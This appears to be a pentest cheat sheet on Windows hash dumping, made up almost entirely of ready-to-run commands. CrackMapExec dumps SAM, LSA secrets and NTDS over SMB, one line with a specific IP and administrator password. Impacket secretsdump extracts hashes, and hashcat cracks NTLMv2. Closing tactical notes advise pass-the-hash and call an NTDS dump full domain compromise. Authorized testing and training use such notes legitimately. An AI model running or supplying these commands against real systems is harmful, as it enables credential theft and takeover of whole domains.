# Hash Dumping

Goal: Extract password hashes for offline cracking or pass-the-hash.

---

# CrackMapExec – Dump SAM

crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

---

# CrackMapExec – Dump LSA Secrets

crackmapexec smb <IP> -u <user> -p <password> --lsa

---

# CrackMapExec – Dump NTDS

crackmapexec smb <IP> -u <user> -p <password> --ntds

---

# Impacket Secretsdump (Local Files)

secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

---

# Hashcat – NTLMv2

hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt

---

# Tactical Notes

- Prefer offline cracking.
- Use pass-the-hash when cracking fails.
- NTDS dump = full domain compromise.
